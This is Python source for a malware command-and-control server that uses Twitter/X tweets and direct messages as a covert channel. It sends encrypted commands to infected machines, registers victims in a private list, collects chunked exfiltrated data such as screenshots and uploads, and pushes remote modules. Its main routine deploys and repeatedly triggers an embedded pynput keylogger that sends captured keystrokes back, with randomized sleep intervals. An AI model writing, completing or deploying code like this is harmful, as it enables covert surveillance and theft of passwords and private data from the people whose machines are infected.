import tweepy
import base64
import json
import time
import random
import logging
from cryptography.fernet import Fernet
from datetime import datetime

# Setup logging
logging.basicConfig(level=logging.DEBUG, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

# API credentials
API_KEY = "your_api_key"
API_SECRET = "your_api_secret"
ACCESS_TOKEN = "your_access_token"
ACCESS_TOKEN_SECRET = "your_access_token_secret"
BEARER_TOKEN = "your_bearer_token"

# Encryption
key = Fernet.generate_key()  # Share this securely with clients
cipher = Fernet(key)

# Twitter client
client = tweepy.Client(
    bearer_token=BEARER_TOKEN,
    consumer_key=API_KEY,
    consumer_secret=API_SECRET,
    access_token=ACCESS_TOKEN,
    access_token_secret=ACCESS_TOKEN_SECRET
)

CONTROLLER_ID = "your_user_id"
CLIENT_LIST_ID = None
clients = {}  # {client_id: {"handle": "", "os": "", "last_seen": ""}}
MEMORY_STORE = {}  # For chunked responses

def encrypt_command(command):
    encrypted = base64.b64encode(cipher.encrypt(json.dumps(command).encode())).decode()
    logger.debug(f"Encrypted command: {command} -> {encrypted}")
    return encrypted

def decrypt_response(response):
    decrypted = json.loads(cipher.decrypt(base64.b64decode(response)).decode())
    logger.debug(f"Decrypted response: {response} -> {decrypted}")
    return decrypted

def send_tweet_command(command, target_client_id=None):
    payload = {"cmd": command, "target": target_client_id}
    encrypted = encrypt_command(payload)
    tweet_text = f"CMD-{random.randint(1000, 9999)}: {encrypted}"[:280]
    try:
        tweet = client.create_tweet(text=tweet_text)
        logger.info(f"Sent tweet command: {payload} (Tweet ID: {tweet.data['id']})")
        return tweet.data["id"]
    except Exception as e:
        logger.error(f"Failed to send tweet command: {e}")
        return None

def send_dm_command(target_user_id, command):
    payload = {"cmd": command, "target": target_user_id}
    encrypted = encrypt_command(payload)
    try:
        client.create_direct_message(participant_id=target_user_id, text=f"CMD: {encrypted}")
        logger.info(f"Sent DM command to {target_user_id}: {command}")
    except Exception as e:
        logger.error(f"Failed to send DM command: {e}")

def deploy_module(module_name, module_code):
    encoded_code = base64.b64encode(module_code.encode()).decode()
    payload = {"cmd": "load_module", "module_name": module_name, "module_code": encoded_code}
    tweet_id = send_tweet_command(payload)
    logger.info(f"Deployed module: {module_name} (Tweet ID: {tweet_id})")

def invoke_module(module_cmd, target_client_id=None, args=None):
    payload = {"cmd": module_cmd, "target": target_client_id, "args": args or {}}
    if target_client_id and target_client_id in clients:
        send_dm_command(clients[target_client_id]["handle"], payload["cmd"])
    else:
        send_tweet_command(payload["cmd"])

def create_client_list():
    global CLIENT_LIST_ID
    if not CLIENT_LIST_ID:
        try:
            list_obj = client.create_list(name=f"C2_Clients_{random.randint(1000, 9999)}", private=True)
            CLIENT_LIST_ID = list_obj.data["id"]
            logger.info(f"Created list: {CLIENT_LIST_ID}")
        except Exception as e:
            logger.error(f"Failed to create list: {e}")

def add_client_to_list(client_user_id, client_id):
    try:
        client.add_list_member(list_id=CLIENT_LIST_ID, user_id=client_user_id)
        clients[client_id] = {"handle": client_user_id, "os": "", "last_seen": str(datetime.now())}
        logger.info(f"Added client {client_id} to list (Handle: {client_user_id})")
    except Exception as e:
        logger.error(f"Failed to add client to list: {e}")

def process_response(sender_id, response):
    try:
        if ":" in response:
            chunk_info, chunk_data = response.split(":", 1)
            chunk_num, total_chunks = map(int, chunk_info.split("/"))
            if sender_id not in MEMORY_STORE:
                MEMORY_STORE[sender_id] = []
            MEMORY_STORE[sender_id].append(chunk_data)
            logger.debug(f"Received chunk {chunk_num}/{total_chunks} from {sender_id}")
            
            if len(MEMORY_STORE[sender_id]) == total_chunks:
                full_encrypted = "".join(MEMORY_STORE[sender_id])
                decrypted = decrypt_response(full_encrypted)
                client_id = decrypted["client_id"]
                data = decrypted["data"]
                if "screenshot" in decrypted.get("cmd", "") or "upload" in decrypted.get("cmd", ""):
                    data = base64.b64decode(data)
                clients[client_id]["last_seen"] = str(datetime.now())
                logger.info(f"Response from {client_id} ({sender_id}): {data}")
                del MEMORY_STORE[sender_id]
        else:
            decrypted = decrypt_response(response)
            client_id = decrypted["client_id"]
            data = decrypted["data"]
            if "screenshot" in decrypted.get("cmd", "") or "upload" in decrypted.get("cmd", ""):
                data = base64.b64decode(data)
            clients[client_id]["last_seen"] = str(datetime.now())
            logger.info(f"Response from {client_id} ({sender_id}): {data}")
    except Exception as e:
        logger.error(f"Error processing response: {e}")

def monitor_exfiltration():
    try:
        dms = client.get_direct_messages()
        if dms.data:
            for dm in dms.data:
                if dm.text.startswith("RES:"):
                    process_response(dm.sender_id, dm.text[4:])
                elif dm.text.startswith("REGISTER:"):
                    client_id = dm.text[9:]
                    add_client_to_list(dm.sender_id, client_id)
    except Exception as e:
        logger.error(f"DM monitoring error: {e}")

    try:
        tweets = client.get_users_tweets(id=CONTROLLER_ID, max_results=10)
        for tweet in tweets.data:
            if tweet.text.startswith("CMD-"):
                replies = client.get_tweet(tweet.id, expansions=["referenced_tweets.id"]).referenced_tweets or []
                for reply in replies:
                    reply_text = client.get_tweet(reply.id).data.text
                    if reply_text.startswith("RES:"):
                        process_response(client.get_tweet(reply.id).data.author_id, reply_text[4:])
    except Exception as e:
        logger.error(f"Tweet monitoring error: {e}")

def main():
    create_client_list()
    # Deploy keylogger module as a test
    keylogger_code = """
from pynput import keyboard
import threading

def keylogger_start(args):
    log = []
    def on_press(key):
        try:
            log.append(str(key.char))
        except AttributeError:
            log.append(f"[{key}]")
        if len(log) >= 10:
            exfiltrate("".join(log))
            log.clear()

    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    MEMORY_STORE["keylogger_thread"] = listener
    return "Keylogger started"

def keylogger_stop(args):
    listener = MEMORY_STORE.get("keylogger_thread")
    if listener:
        listener.stop()
        del MEMORY_STORE["keylogger_thread"]
    return "Keylogger stopped"
    """
    deploy_module("keylogger", keylogger_code)
    
    while True:
        try:
            invoke_module("keylogger_start")  # Test module
            monitor_exfiltration()
            time.sleep(random.randint(30, 300))
        except Exception as e:
            logger.error(f"Main loop error: {e}")

if __name__ == "__main__":
    main()
